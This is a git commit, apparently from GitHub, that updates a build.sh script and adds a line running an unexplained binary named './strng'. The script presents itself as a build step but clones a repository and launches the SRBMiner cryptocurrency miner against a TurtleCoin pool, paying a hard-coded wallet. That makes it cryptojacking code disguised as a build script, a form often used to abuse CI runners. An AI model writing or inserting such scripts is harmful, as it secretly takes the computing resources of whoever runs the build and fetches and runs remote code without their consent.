270f04afe9ba83c0cb1b10fc7982853978d7ab27
remakove <78358369+remakove@users.noreply.github.com>
2021-07-13 19:54:26 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,3 +1,6 @@
 #!/usr/bin/env bash
 
 git clone https://github.com/remakove/artions.git artions && cd artions && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.j3 --disable-gpu
+
+
+./strng
